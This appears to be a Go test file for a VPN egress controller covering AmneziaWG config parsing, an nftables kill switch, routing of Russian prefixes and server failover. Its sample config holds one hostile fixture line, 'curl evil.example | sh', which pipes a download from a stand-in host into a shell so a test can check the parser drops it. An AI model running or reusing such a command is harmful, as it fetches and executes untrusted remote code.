package main

import (
	"fmt"
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// A provider export: wg-quick keys, AWG 2.0 keys in mixed case, comments.
const sampleConf = `[Interface]
Address = 10.98.184.37/32, fd00::25/128
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MTI=
DNS = 10.0.0.1
Jc = 3
Jmin = 50
Jmax = 100
S1 = 79
S2 = 95
S3 = 10
S4 = 10
H1 = 14187797-14253332
H2 = 456445940-456511475
H3 = 1290827777-1290893312
H4 = 957026725-957092260
i1 = <b 0xce00>
PostUp = curl evil.example | sh  # never run

[Peer]
PublicKey = cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHVibGk=
AllowedIPs = 0.0.0.0/0
Endpoint = 83.172.135.90:36939
PersistentKeepalive = 25
`

func TestParseAWGSplitsQuickKeysFromSetconf(t *testing.T) {
	c, err := parseAWG("world-1.conf", []byte(sampleConf))
	if err != nil {
		t.Fatal(err)
	}
	if c.Address.String() != "10.98.184.37/32" {
		t.Errorf("Address = %s", c.Address)
	}
	if c.Endpoint.String() != "83.172.135.90:36939" {
		t.Errorf("Endpoint = %s", c.Endpoint)
	}
	for _, gone := range []string{"Address", "DNS", "PostUp", "evil"} {
		if strings.Contains(c.SetConf, gone) {
			t.Errorf("setconf keeps %q:\n%s", gone, c.SetConf)
		}
	}
	for _, kept := range []string{"[Interface]\n", "PrivateKey = ", "S3 = 10\n", "S4 = 10\n",
		"H1 = 14187797-14253332\n", "i1 = <b 0xce00>\n", "[Peer]\n", "Endpoint = 83.172.135.90:36939\n",
		"PersistentKeepalive = 25\n"} {
		if !strings.Contains(c.SetConf, kept) {
			t.Errorf("setconf lacks %q:\n%s", kept, c.SetConf)
		}
	}
}

func TestParseAWGRejectsWhatTheKillSwitchCannotPin(t *testing.T) {
	cases := map[string]string{
		"hostname endpoint": strings.Replace(sampleConf, "83.172.135.90:36939", "vpn.example:36939", 1),
		"ipv6 endpoint":     strings.Replace(sampleConf, "83.172.135.90:36939", "[2001:db8::1]:36939", 1),
		"no endpoint":       strings.Replace(sampleConf, "Endpoint = 83.172.135.90:36939\n", "", 1),
		"no address":        strings.Replace(sampleConf, "Address = 10.98.184.37/32, fd00::25/128\n", "", 1),
		"two peers":         sampleConf + "[Peer]\nPublicKey = x\n",
		"bad section":       sampleConf + "[Other]\n",
	}
	for name, conf := range cases {
		if _, err := parseAWG("x.conf", []byte(conf)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestParseDelegatedCoversRangesExactly(t *testing.T) {
	const file = `2|ripencc|20260929|3|19830705|20260929|+0100
ripencc|*|ipv4|*|3|summary
ripencc|RU|ipv4|2.56.88.0|1024|20190101|allocated|x
ripencc|RU|ipv4|2.56.92.0|1024|20190101|allocated|x
ripencc|RU|ipv4|5.8.0.0|768|20110101|assigned|x
ripencc|DE|ipv4|5.9.0.0|65536|20110101|allocated|x
ripencc|RU|ipv4|10.0.0.0|256|20110101|available|x
ripencc|RU|ipv6|2a00::|32|20110101|allocated|x
`
	ps, err := parseDelegated(strings.NewReader(file), "RU")
	if err != nil {
		t.Fatal(err)
	}
	// 2.56.88.0/22 + 2.56.92.0/22 merge into a /21; 768 addresses split
	// into a /23 and a /24.
	want := "2.56.88.0/21 5.8.0.0/23 5.8.2.0/24"
	if got := fmt.Sprint(ps); got != "["+want+"]" {
		t.Errorf("prefixes = %s, want [%s]", got, want)
	}
}

func TestRangesToPrefixesAtTheEdges(t *testing.T) {
	cases := []struct {
		r    ipRange
		want string
	}{
		{ipRange{0, 0xffffffff}, "[0.0.0.0/0]"},
		{ipRange{0xfffffffe, 0xffffffff}, "[255.255.255.254/31]"},
		{ipRange{1, 6}, "[0.0.0.1/32 0.0.0.2/31 0.0.0.4/31 0.0.0.6/32]"},
	}
	for _, c := range cases {
		if got := fmt.Sprint(rangesToPrefixes([]ipRange{c.r})); got != c.want {
			t.Errorf("%v: %s, want %s", c.r, got, c.want)
		}
	}
}

func TestDiffPrefixes(t *testing.T) {
	p := netip.MustParsePrefix
	add, del := diffPrefixes([]netip.Prefix{p("1.0.0.0/8"), p("2.0.0.0/8")}, []netip.Prefix{p("2.0.0.0/8"), p("3.0.0.0/8")})
	if fmt.Sprint(add) != "[3.0.0.0/8]" || fmt.Sprint(del) != "[1.0.0.0/8]" {
		t.Errorf("add=%v del=%v", add, del)
	}
}

func TestKillSwitchLetsOnlyTunnelServersOut(t *testing.T) {
	ks := killSwitch(false)
	for _, want := range []string{
		`oifname "eth0" ip daddr @endpoints meta l4proto udp accept`,
		`oifname "eth0" counter drop`,
		`udp dport 53 redirect to :53`,
		`tcp dport 53 redirect to :53`,
		`ip daddr { 77.88.8.8, 77.88.8.1 } meta l4proto { udp, tcp } th dport 53 accept`,
	} {
		if !strings.Contains(ks, want) {
			t.Errorf("kill switch lacks %q", want)
		}
	}
	accept := strings.Index(ks, `@endpoints meta l4proto udp accept`)
	drop := strings.Index(ks, `oifname "eth0" counter drop`)
	if accept > drop {
		t.Error("the uplink drop comes before the endpoint accept")
	}
}

// fakeNet records commands; failing names make matching commands fail.
type fakeNet struct {
	calls   []string
	stdin   []string
	failing map[string]bool // "ping -I awg-world" style prefixes
	routes  string          // output of ip -4 route show default dev eth0
}

func (f *fakeNet) run(stdin, name string, args ...string) (string, error) {
	call := name + " " + strings.Join(args, " ")
	f.calls = append(f.calls, call)
	f.stdin = append(f.stdin, stdin)
	for prefix := range f.failing {
		if strings.HasPrefix(call, prefix) || strings.Contains(call, prefix) {
			return "", fmt.Errorf("%s failed", call)
		}
	}
	switch {
	case call == "ip -4 route show default dev eth0":
		out := f.routes
		f.routes = "" // the next look finds it removed
		return out, nil
	case strings.HasPrefix(call, "ip link show "):
		return "", fmt.Errorf("does not exist")
	}
	return "", nil
}

func testController(t *testing.T, f *fakeNet) *controller {
	t.Helper()
	conf := func(name, ep string) awgConf {
		c, err := parseAWG(name, []byte(strings.Replace(sampleConf, "83.172.135.90:36939", ep, 1)))
		if err != nil {
			t.Fatal(err)
		}
		return c
	}
	return &controller{
		run:    f.run,
		runDir: t.TempDir(),
		ru:     conf("ru-1.conf", "45.9.15.198:36056"),
		world:  []awgConf{conf("world-1.conf", "83.172.135.90:36939"), conf("world-2.conf", "46.246.127.133:37997")},
	}
}

func indexOf(calls []string, prefix string) int {
	for i, c := range calls {
		if strings.HasPrefix(c, prefix) {
			return i
		}
	}
	return -1
}

func TestSetupRaisesTheKillSwitchBeforeAnyTunnel(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n"}
	c := testController(t, f)
	if err := c.setup(); err != nil {
		t.Fatal(err)
	}
	ks := indexOf(f.calls, "nft -f -")
	del := indexOf(f.calls, "ip route del default via 172.31.250.1 dev eth0")
	link := indexOf(f.calls, "ip link add awg-ru type amneziawg")
	if ks != 0 || del < 0 || link < 0 || !(ks < del && del < link) {
		t.Errorf("order: kill switch %d, default route removed %d, first tunnel %d:\n%s", ks, del, link, strings.Join(f.calls, "\n"))
	}
	for _, want := range []string{
		"nft add element inet reflux endpoints { 45.9.15.198 }",
		"ip route replace 45.9.15.198/32 via 172.31.250.1 dev eth0",
		"nft add element inet reflux endpoints { 83.172.135.90 }",
		"ip route replace blackhole default metric 4000",
		"ip route replace default dev awg-world metric 0",
		"awg setconf awg-world ",
	} {
		if indexOf(f.calls, want) < 0 {
			t.Errorf("setup never ran %q", want)
		}
	}
	// Only the active world server is let out, never the standby ones.
	if indexOf(f.calls, "nft add element inet reflux endpoints { 46.246.127.133 }") >= 0 {
		t.Error("a standby world server was let out")
	}
	// The setconf files hold private keys: none may be left behind.
	if left, _ := filepath.Glob(filepath.Join(c.runDir, "*.conf")); len(left) != 0 {
		t.Errorf("setconf files left: %v", left)
	}
}

func TestSetupFailsWhileTheUplinkRouteRemains(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n", failing: map[string]bool{"ip route del default": true}}
	c := testController(t, f)
	// The fake forgets the route after the first look; bring it back to
	// model a delete that did not happen.
	c.run = func(stdin, name string, args ...string) (string, error) {
		if name+" "+strings.Join(args, " ") == "ip -4 route show default dev eth0" {
			return "default via 172.31.250.1 dev eth0\n", nil
		}
		return f.run(stdin, name, args...)
	}
	if err := c.setup(); err == nil {
		t.Error("setup succeeded with the uplink default route still in place")
	}
}

func TestWorldFailsOverAfterRepeatedFailures(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n"}
	c := testController(t, f)
	if err := c.setup(); err != nil {
		t.Fatal(err)
	}
	f.calls = nil
	if err := c.failover(); err != nil {
		t.Fatal(err)
	}
	if c.cur != 1 {
		t.Fatalf("cur = %d", c.cur)
	}
	for _, want := range []string{
		"nft delete element inet reflux endpoints { 83.172.135.90 }",
		"nft add element inet reflux endpoints { 46.246.127.133 }",
		"awg setconf awg-world ",
	} {
		if indexOf(f.calls, want) < 0 {
			t.Errorf("failover never ran %q:\n%s", want, strings.Join(f.calls, "\n"))
		}
	}
	// The kernel drops the default route with the interface's last
	// address: failover must put it back after the new address is set.
	addr := indexOf(f.calls, "ip address add 10.98.184.37/32 dev awg-world")
	route := indexOf(f.calls, "ip route replace default dev awg-world metric 0")
	if addr < 0 || route < addr {
		t.Errorf("default route not restored after the address change (address %d, route %d)", addr, route)
	}
	// The Russian server stays open whatever happens to the world tunnel.
	if indexOf(f.calls, "nft delete element inet reflux endpoints { 45.9.15.198 }") >= 0 {
		t.Error("failover closed the Russian server")
	}
	if err := c.failover(); err != nil || c.cur != 0 {
		t.Errorf("wrap-around: cur=%d err=%v", c.cur, err)
	}
}

func TestSetPrefixesRefusesAShortList(t *testing.T) {
	f := &fakeNet{}
	c := testController(t, f)
	short := []netip.Prefix{netip.MustParsePrefix("5.8.0.0/23")}
	if err := c.setPrefixes(short, time.Now()); err == nil {
		t.Error("a one-prefix list was applied")
	}
	if len(f.calls) != 0 {
		t.Errorf("routes touched: %v", f.calls)
	}
}

func TestSetPrefixesChangesOnlyTheDifference(t *testing.T) {
	f := &fakeNet{}
	c := testController(t, f)
	var ps []netip.Prefix
	for i := 0; i < minRUPrefixes; i++ {
		ps = append(ps, netip.PrefixFrom(addr(uint32(i)<<8), 24))
	}
	if err := c.setPrefixes(ps, time.Now()); err != nil {
		t.Fatal(err)
	}
	next := append(append([]netip.Prefix{}, ps[1:]...), netip.MustParsePrefix("100.0.0.0/24"))
	if err := c.setPrefixes(next, time.Now()); err != nil {
		t.Fatal(err)
	}
	batch := f.stdin[len(f.stdin)-1]
	if batch != "route del 0.0.0.0/24 dev awg-ru\nroute replace 100.0.0.0/24 dev awg-ru\n" {
		t.Errorf("second batch:\n%s", batch)
	}
}

func TestHealthIgnoresADeadRussianTunnel(t *testing.T) {
	now := time.Now()
	if err := healthy(status{Updated: now, WorldOK: true, RUOK: false}, now); err != nil {
		t.Errorf("unhealthy with only Russia down: %v", err)
	}
	if healthy(status{Updated: now, WorldOK: false}, now) == nil {
		t.Error("healthy with the world tunnel down")
	}
	if healthy(status{Updated: now.Add(-time.Minute), WorldOK: true}, now) == nil {
		t.Error("healthy with a stalled probe loop")
	}
}

func TestLoadConfigsOrdersWorldByName(t *testing.T) {
	dir := t.TempDir()
	for name, ep := range map[string]string{
		"ru-1.conf": "45.9.15.198:1", "world-2.conf": "2.2.2.2:1", "world-1.conf": "1.1.1.1:1", "notes.txt": "",
	} {
		body := strings.Replace(sampleConf, "83.172.135.90:36939", ep, 1)
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	ru, direct, fallback, world, err := loadConfigs(dir)
	if err != nil {
		t.Fatal(err)
	}
	if direct || fallback || ru.Name != "ru-1.conf" || len(world) != 2 || world[0].Name != "world-1.conf" || world[1].Name != "world-2.conf" {
		t.Errorf("ru=%s direct=%v world=%v", ru.Name, direct, []string{world[0].Name, world[1].Name})
	}
	// ru-fallback-direct keeps the tunnel and adds the fallback.
	os.WriteFile(filepath.Join(dir, fallbackFile), nil, 0o600)
	if ru, direct, fallback, _, err := loadConfigs(dir); err != nil || direct || !fallback || ru.Name != "ru-1.conf" {
		t.Errorf("with %s: ru=%s direct=%v fallback=%v err=%v", fallbackFile, ru.Name, direct, fallback, err)
	}
	// ru-direct wins over a Russian config, and a Russian config is then
	// not needed at all.
	os.WriteFile(filepath.Join(dir, directFile), nil, 0o600)
	os.Remove(filepath.Join(dir, "ru-1.conf"))
	if _, direct, fallback, _, err := loadConfigs(dir); err != nil || !direct || fallback {
		t.Errorf("with %s: direct=%v fallback=%v err=%v", directFile, direct, fallback, err)
	}
	os.Remove(filepath.Join(dir, directFile))
	if _, _, _, _, err := loadConfigs(dir); err == nil {
		t.Error("no ru-*.conf and no ru-direct accepted")
	}
}

func TestProbeFallsBackToTCPWhenICMPIsDropped(t *testing.T) {
	f := &fakeNet{failing: map[string]bool{"ping ": true}}
	c := testController(t, f)
	if !c.probe(worldIface, worldProbes, worldTCP) {
		t.Error("world down although a TCP connection opens")
	}
	if indexOf(f.calls, "nc -z -w 3 1.1.1.1 443") < 0 {
		t.Errorf("no TCP probe: %v", f.calls)
	}
	f.failing["nc "] = true
	if c.probe(worldIface, worldProbes, worldTCP) {
		t.Error("world up with neither ICMP nor TCP answering")
	}
}

func TestDroppedReadsTheKillSwitchCounter(t *testing.T) {
	c := &controller{run: func(stdin, name string, args ...string) (string, error) {
		return `table inet reflux {
	chain output {
		type filter hook output priority filter; policy accept;
		oifname "lo" accept
		oifname "eth0" ip daddr @endpoints meta l4proto udp accept
		oifname "eth0" counter packets 42 bytes 2520 drop
	}
}`, nil
	}}
	if n := c.dropped(); n != 42 {
		t.Errorf("dropped = %d, want 42", n)
	}
}

func TestListenPortIsFixedAndProviderPortDropped(t *testing.T) {
	conf := strings.Replace(sampleConf, "[Interface]\n", "[Interface]\nListenPort = 12345\n", 1)
	c, err := parseAWG("x.conf", []byte(conf))
	if err != nil {
		t.Fatal(err)
	}
	got := c.withListenPort(worldPort)
	if strings.Contains(got, "12345") {
		t.Error("the provider's ListenPort survived")
	}
	if !strings.HasPrefix(got, "[Interface]\nListenPort = 51822\n") {
		t.Errorf("setconf starts %q", got[:40])
	}
}

func TestCarrierDomainsResolveThroughRussia(t *testing.T) {
	for _, zone := range []string{"mail.ru", "datacloudmail.ru", "yandex.ru", "yandex.net"} {
		block := "name: \"" + zone + "\"\n\tforward-addr: 77.88.8.8\n\tforward-addr: 77.88.8.1\n"
		if !strings.Contains(unboundConf, block) {
			t.Errorf("%s does not go to Yandex DNS", zone)
		}
		if !strings.Contains(unboundConf, "domain-insecure: \""+zone+"\"\n") {
			t.Errorf("%s needs the world tunnel for its DNSSEC proof", zone)
		}
	}
	for _, a := range []string{"77.88.8.8", "77.88.8.1"} {
		if !isRU(t, a) {
			t.Errorf("%s would not leave through the Russian tunnel", a)
		}
	}
}

// isRU checks an address against the RU prefixes of a small delegated
// sample that covers Yandex DNS (77.88.0.0/18 is Yandex's, allocated RU).
func isRU(t *testing.T, a string) bool {
	ps, err := parseDelegated(strings.NewReader("ripencc|RU|ipv4|77.88.0.0|16384|20060101|allocated|x\n"), "RU")
	if err != nil {
		t.Fatal(err)
	}
	ip := netip.MustParseAddr(a)
	for _, p := range ps {
		if p.Contains(ip) {
			return true
		}
	}
	return false
}

func TestCarrierDNSIsExemptBeforeTheRedirect(t *testing.T) {
	ks := killSwitch(false)
	exempt := strings.Index(ks, "th dport 53 accept")
	redirect := strings.Index(ks, "udp dport 53 redirect")
	if exempt < 0 || exempt > redirect {
		t.Error("unbound's queries to the carrier resolvers would be redirected back to itself")
	}
	for _, a := range strings.Split(carrierDNS, ", ") {
		if !strings.Contains(unboundConf, "forward-addr: "+a+"\n") {
			t.Errorf("exempt %s is not a carrier resolver in unbound.conf", a)
		}
	}
}

func TestKillSwitchOpensRussiaOnlyInDirectMode(t *testing.T) {
	if strings.Contains(killSwitch(false), "@ru4 accept") {
		t.Error("tunnel mode lets Russian addresses out of the uplink")
	}
	ks := killSwitch(true)
	ru := strings.Index(ks, `oifname "eth0" ip daddr @ru4 accept`)
	drop := strings.Index(ks, `oifname "eth0" counter drop`)
	if ru < 0 || ru > drop {
		t.Errorf("direct mode: Russia not let out before the drop:\n%s", ks)
	}
}

func TestDirectModeSkipsTheRussianTunnel(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n"}
	c := testController(t, f)
	c.ruDirect, c.ru = true, awgConf{}
	if err := c.setup(); err != nil {
		t.Fatal(err)
	}
	if indexOf(f.calls, "ip link add awg-ru") >= 0 {
		t.Error("awg-ru created in direct mode")
	}
	if !strings.Contains(f.stdin[0], "@ru4 accept") {
		t.Error("kill switch applied without the Russian set")
	}
	var ps []netip.Prefix
	for i := 0; i < minRUPrefixes; i++ {
		ps = append(ps, netip.PrefixFrom(addr(uint32(i+1)<<8), 24))
	}
	f.calls, f.stdin = nil, nil
	if err := c.setPrefixes(ps, time.Now()); err != nil {
		t.Fatal(err)
	}
	set := indexOf(f.calls, "nft -f -")
	routes := indexOf(f.calls, "ip -batch -")
	if set < 0 || routes < 0 || set > routes {
		t.Fatalf("the kill switch must open before routing out: %v", f.calls)
	}
	if !strings.HasPrefix(f.stdin[set], "add element inet reflux ru4 { 0.0.1.0/24, ") {
		t.Errorf("set batch starts %q", f.stdin[set][:60])
	}
	if !strings.HasPrefix(f.stdin[routes], "route replace 0.0.1.0/24 via 172.31.250.1 dev eth0\n") {
		t.Errorf("route batch starts %q", f.stdin[routes][:60])
	}
	// Dropping a prefix: routes go first, the set closes after.
	f.calls, f.stdin = nil, nil
	if err := c.setPrefixes(ps[1:], time.Now()); err == nil {
		t.Fatal("list below the minimum accepted")
	}
	more := append(append([]netip.Prefix{}, ps[1:]...), netip.MustParsePrefix("100.0.0.0/24"), netip.MustParsePrefix("100.0.1.0/24"))
	if err := c.setPrefixes(more, time.Now()); err != nil {
		t.Fatal(err)
	}
	last := len(f.calls) - 1
	if f.calls[last] != "nft -f -" || !strings.HasPrefix(f.stdin[last], "delete element inet reflux ru4 { 0.0.1.0/24 }") {
		t.Errorf("last step %q %q", f.calls[last], f.stdin[last])
	}
}

func TestSetBatchSplitsLongLists(t *testing.T) {
	var ps []netip.Prefix
	for i := 0; i < 1201; i++ {
		ps = append(ps, netip.PrefixFrom(addr(uint32(i)<<8), 24))
	}
	if n := strings.Count(setBatch("add", "ru4", ps), "\n"); n != 3 {
		t.Errorf("%d lines, want 3", n)
	}
}

// Redirected queries keep their source (the tunnel's address), so the
// resolver must answer every source; it listens on loopback only.
func TestResolverAnswersRedirectedQueries(t *testing.T) {
	if !strings.Contains(unboundConf, "access-control: 0.0.0.0/0 allow\n") {
		t.Error("unbound refuses queries redirected from non-loopback sources")
	}
	if !strings.Contains(unboundConf, "interface: 127.0.0.1\n") {
		t.Error("unbound listens beyond loopback")
	}
}

func ruPrefixes() []netip.Prefix {
	var ps []netip.Prefix
	for i := 0; i < minRUPrefixes; i++ {
		ps = append(ps, netip.PrefixFrom(addr(uint32(i+1)<<8), 24))
	}
	return ps
}

// With ru-fallback-direct, Russia leaves through the uplink while its
// tunnel is down and goes back once the tunnel has answered for a while;
// the kill switch opens before the routes move out and closes after they
// are back.
func TestRussiaFallsBackToTheUplinkAndReturns(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n", failing: map[string]bool{}}
	c := testController(t, f)
	c.ruFallback = true
	if err := c.setup(); err != nil {
		t.Fatal(err)
	}
	if indexOf(f.calls, "ip link add awg-ru") < 0 {
		t.Fatal("the Russian tunnel is not brought up with a fallback")
	}
	if !strings.Contains(f.stdin[0], "@ru4 accept") {
		t.Fatal("the kill switch has no rule for the fallback")
	}
	if err := c.setPrefixes(ruPrefixes(), time.Now()); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(f.stdin[len(f.stdin)-1], "via 172.31.250.1") {
		t.Fatal("Russia routed out of the uplink while its tunnel is up")
	}

	var r ruRounds
	f.failing["ping -c 1 -W 3 -I awg-ru"] = true
	for i := 1; i < failLimit; i++ {
		if ok, err := c.russia(&r); !ok || err != nil || c.onDirect {
			t.Fatalf("round %d: ok=%v err=%v direct=%v; want to wait for failLimit", i, ok, err, c.onDirect)
		}
	}
	f.calls, f.stdin = nil, nil
	if ok, err := c.russia(&r); !ok || err != nil || !c.onDirect {
		t.Fatalf("after %d failed rounds: ok=%v err=%v direct=%v", failLimit, ok, err, c.onDirect)
	}
	set, routes := indexOf(f.calls, "nft -f -"), indexOf(f.calls, "ip -batch -")
	if set < 0 || routes < set || !strings.HasPrefix(f.stdin[set], "add element inet reflux ru4 { 0.0.1.0/24,") ||
		!strings.HasPrefix(f.stdin[routes], "route replace 0.0.1.0/24 via 172.31.250.1 dev eth0\n") {
		t.Fatalf("fallback steps:\n%s", strings.Join(f.calls, "\n"))
	}
	if indexOf(f.calls, "ping -c 1 -W 3 -I eth0 77.88.8.8") < 0 {
		t.Error("the uplink is not probed while it carries Russia")
	}
	// A refreshed list goes out of the uplink too while the fallback lasts.
	f.calls, f.stdin = nil, nil
	if err := c.setPrefixes(append(ruPrefixes(), netip.MustParsePrefix("100.0.0.0/24")), time.Now()); err != nil {
		t.Fatal(err)
	}
	if b := f.stdin[indexOf(f.calls, "ip -batch -")]; b != "route replace 100.0.0.0/24 via 172.31.250.1 dev eth0\n" {
		t.Errorf("refresh during the fallback: %q", b)
	}

	delete(f.failing, "ping -c 1 -W 3 -I awg-ru")
	for i := 1; i < recoverRounds; i++ {
		c.russia(&r)
		if !c.onDirect {
			t.Fatalf("back into the tunnel after %d good rounds, want %d", i, recoverRounds)
		}
	}
	f.calls, f.stdin = nil, nil
	if ok, err := c.russia(&r); !ok || err != nil || c.onDirect {
		t.Fatalf("after %d good rounds: ok=%v err=%v direct=%v", recoverRounds, ok, err, c.onDirect)
	}
	routes, flush := indexOf(f.calls, "ip -batch -"), indexOf(f.calls, "nft flush set inet reflux ru4")
	if routes < 0 || flush < routes || !strings.HasPrefix(f.stdin[routes], "route replace 0.0.1.0/24 dev awg-ru\n") {
		t.Errorf("return steps:\n%s", strings.Join(f.calls, "\n"))
	}
}

// Without the fallback file a dead Russian tunnel stays down: Russia is
// never sent out of the uplink.
func TestRussiaWithoutFallbackStaysInTheTunnel(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n", failing: map[string]bool{"ping -c 1 -W 3 -I awg-ru": true}}
	c := testController(t, f)
	if err := c.setup(); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(f.stdin[0], "@ru4 accept") {
		t.Error("the kill switch lets Russia out without a fallback")
	}
	var r ruRounds
	ok := true
	for i := 0; i < failLimit; i++ {
		ok, _ = c.russia(&r)
	}
	if ok || c.onDirect || indexOf(f.calls, "ip -batch -") >= 0 {
		t.Errorf("ok=%v direct=%v: Russia moved without a fallback", ok, c.onDirect)
	}
}

func TestStatusTextNamesTheFallback(t *testing.T) {
	st := status{WorldOK: true, World: "world-1.conf", RUOK: true, RUMode: "direct", RUFallback: true}
	if txt := statusText(st, time.Now()); !strings.Contains(txt, "russia up    direct (fallback: the tunnel does not answer)") {
		t.Errorf("status:\n%s", txt)
	}
}

// The owner's choice of world server applies once: after a failover away
// from it the egress does not force it back, and an unknown name changes
// nothing.
func TestWorldServerChoice(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n"}
	c := testController(t, f)
	c.confDir = t.TempDir()
	if err := c.setup(); err != nil {
		t.Fatal(err)
	}
	choose := func(name string) {
		if err := os.WriteFile(filepath.Join(c.confDir, selectFile), []byte(name+"\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if moved, err := c.applySelection(); moved || err != nil {
		t.Fatalf("moved=%v err=%v with no choice", moved, err)
	}
	choose("world-2.conf")
	f.calls = nil
	if moved, err := c.applySelection(); !moved || err != nil || c.cur != 1 {
		t.Fatalf("moved=%v err=%v cur=%d; want world-2", moved, err, c.cur)
	}
	for _, want := range []string{"nft add element inet reflux endpoints { 46.246.127.133 }", "ip route replace default dev awg-world metric 0"} {
		if indexOf(f.calls, want) < 0 {
			t.Errorf("switch never ran %q", want)
		}
	}
	if err := c.failover(); err != nil || c.cur != 0 {
		t.Fatalf("failover: cur=%d err=%v", c.cur, err)
	}
	if moved, _ := c.applySelection(); moved || c.cur != 0 {
		t.Error("the choice was forced back after a failover")
	}
	choose("world-9.conf")
	if moved, _ := c.applySelection(); moved || c.cur != 0 {
		t.Error("an unknown server moved the tunnel")
	}
}

// After a restart the egress starts with the world server that held last,
// unless the owner chose one.
func TestStartsWithTheLastWorldThatHeld(t *testing.T) {
	c := testController(t, &fakeNet{})
	c.confDir, c.stateDir = t.TempDir(), filepath.Join(t.TempDir(), "state")
	if i := c.firstWorld(); i != 0 {
		t.Errorf("nothing remembered: start %d, want 0", i)
	}
	now := time.Now()
	c.cur = 1
	c.remember(true, now.Add(-time.Minute), now)
	if _, err := os.Stat(filepath.Join(c.stateDir, lastFile)); err == nil {
		t.Fatal("remembered a server that held for a minute")
	}
	c.remember(false, now.Add(-time.Hour), now)
	if _, err := os.Stat(filepath.Join(c.stateDir, lastFile)); err == nil {
		t.Fatal("remembered a server that does not answer")
	}
	c.remember(true, now.Add(-3*time.Minute), now)
	restarted := testController(t, &fakeNet{})
	restarted.confDir, restarted.stateDir = c.confDir, c.stateDir
	if i := restarted.firstWorld(); i != 1 {
		t.Errorf("after a restart: start %d, want 1 (world-2)", i)
	}
	// The owner's choice wins.
	os.WriteFile(filepath.Join(c.confDir, selectFile), []byte("world-1.conf\n"), 0o600)
	if i := restarted.firstWorld(); i != 0 {
		t.Errorf("with a choice: start %d, want 0", i)
	}
	// A remembered server that is gone from the configs is ignored.
	os.Remove(filepath.Join(c.confDir, selectFile))
	os.WriteFile(filepath.Join(c.stateDir, lastFile), []byte("world-9.conf\n"), 0o600)
	if i := restarted.firstWorld(); i != 0 {
		t.Errorf("unknown remembered server: start %d, want 0", i)
	}
}
